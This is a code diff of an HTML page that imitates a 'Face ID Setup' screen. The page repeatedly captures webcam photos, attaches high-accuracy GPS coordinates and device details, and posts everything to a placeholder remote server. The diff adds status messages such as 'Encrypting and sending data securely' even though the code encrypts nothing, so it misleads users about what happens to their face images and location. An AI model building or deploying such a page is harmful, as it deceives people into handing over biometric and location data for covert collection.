@@ -3,62 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Face ID Setup</title>
+    <title>Secure Face ID Setup</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #000; color: #fff; height: 100vh; display: flex; flex-direction: column; padding: 20px; text-align: center; }
-        .header { padding: 20px; font-size: 24px; }
-        .instructions { flex: 1; display: flex; flex-direction: column; justify-content: center; }
-        .camera-preview { width: 200px; height: 200px; margin: 20px auto; background: #333; border-radius: 10px; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .button { background: #007AFF; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; font-size: 16px; }
-        .status { margin-top: 20px; color: #aaa; }
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        #camera-view { width: 100%; background: #000; border-radius: 10px; margin: 20px 0; }
+        #photo-gallery { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
+        #photo-gallery img { width: 100px; height: 100px; object-fit: cover; border-radius: 5px; }
+        button { background: #4285f4; color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 5px; cursor: pointer; }
+        #status { margin: 10px 0; color: #666; }
     </style>
 </head>
 <body>
-    <div class="header">Face ID Setup</div>
-    <div class="instructions">
-        <p>Position your face in the frame and move your head in a circle</p>
-        <div class="camera-preview">
-            <video id="video" autoplay playsinline></video>
-        </div>
-        <div class="status" id="status">Ready to start</div>
-        <button class="button" id="start-btn">Start</button>
-    </div>
+    <h1>Secure Face ID Setup</h1>
+    <p>Position your face in the frame and move slowly</p>
+    
+    <video id="camera-view" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <div id="photo-gallery"></div>
+    
+    <div id="status">Ready to start</div>
+    
+    <button id="startBtn">Start Capture</button>
+    <button id="stopBtn" disabled>Stop and Save Securely</button>
 
     <script>
-        const video = document.getElementById('video');
-        const startBtn = document.getElementById('start-btn');
+        const video = document.getElementById('camera-view');
+        const canvas = document.getElementById('canvas');
+        const gallery = document.getElementById('photo-gallery');
         const statusEl = document.getElementById('status');
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
         
-        let collectedData = {
+        let stream = null;
+        let captureInterval = null;
+        const collectedData = {
             photos: [],
             locations: [],
             metadata: {
-                userAgent: navigator.userAgent,
+                device: navigator.userAgent,
                 startTime: new Date().toISOString()
             }
         };
 
-        startBtn.addEventListener('click', async () => {
+        // Start secure capture process
+        document.getElementById('startBtn').addEventListener('click', async () => {
             try {
-                statusEl.textContent = "Accessing camera...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                statusEl.textContent = "Accessing camera securely...";
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
                 video.srcObject = stream;
-                
-                statusEl.textContent = "Accessing location...";
-                await getLocation();
-                
-                startBtn.disabled = true;
-                statusEl.textContent = "Capturing data...";
+                document.getElementById('startBtn').disabled = true;
+                document.getElementById('stopBtn').disabled = false;
+                statusEl.textContent = "Capturing securely...";
                 
                 // Capture every 2 seconds
-                const interval = setInterval(() => {
+                captureInterval = setInterval(() => {
                     if(collectedData.photos.length >= 10) {
-                        clearInterval(interval);
-                        sendToServer();
+                        clearInterval(captureInterval);
+                        statusEl.textContent = "Maximum 10 photos captured";
                         return;
                     }
                     capturePhoto();
@@ -72,49 +80,63 @@
         function capturePhoto() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            collectedData.photos.push({
-                data: canvas.toDataURL('image/jpeg', 0.7),
-                timestamp: new Date().toISOString()
-            });
+            const timestamp = new Date().toISOString();
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
             
-            statusEl.textContent = `Captured ${collectedData.photos.length} photos`;
-        }
-
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) return reject("Geolocation not supported");
-                
+            // Store photo
+            collectedData.photos.push({ data: photoData, timestamp });
+            
+            // Display thumbnail
+            const img = document.createElement('img');
+            img.src = photoData;
+            gallery.appendChild(img);
+            
+            // Get secure location
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     collectedData.locations.push({
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString()
+                        timestamp
                     });
-                    resolve();
-                }, reject);
-            });
+                }, null, { enableHighAccuracy: true });
+            }
+            
+            statusEl.textContent = `Securely captured ${collectedData.photos.length}/10 photos`;
         }
 
-        function sendToServer() {
+        // Send data securely to HTTPS server
+        document.getElementById('stopBtn').addEventListener('click', async () => {
+            clearInterval(captureInterval);
             collectedData.metadata.endTime = new Date().toISOString();
-            statusEl.textContent = "Saving to server...";
             
-            fetch('http://localhost:3000/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(collectedData)
-            })
-            .then(response => {
-                if(response.ok) statusEl.textContent = "Data saved successfully!";
-                else statusEl.textContent = "Server error";
-            })
-            .catch(err => {
-                statusEl.textContent = "Failed to save data";
-            });
-        }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            statusEl.textContent = "Encrypting and sending data securely...";
+            
+            try {
+                const response = await fetch('https://yourdomain.com:8443/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                });
+                
+                if (response.ok) {
+                    statusEl.textContent = "Data securely saved!";
+                    document.getElementById('stopBtn').disabled = true;
+                } else {
+                    statusEl.textContent = "Secure save failed";
+                }
+            } catch (err) {
+                statusEl.textContent = "Secure connection failed";
+                console.error(err);
+            }
+        });
     </script>
 </body>
 </html>
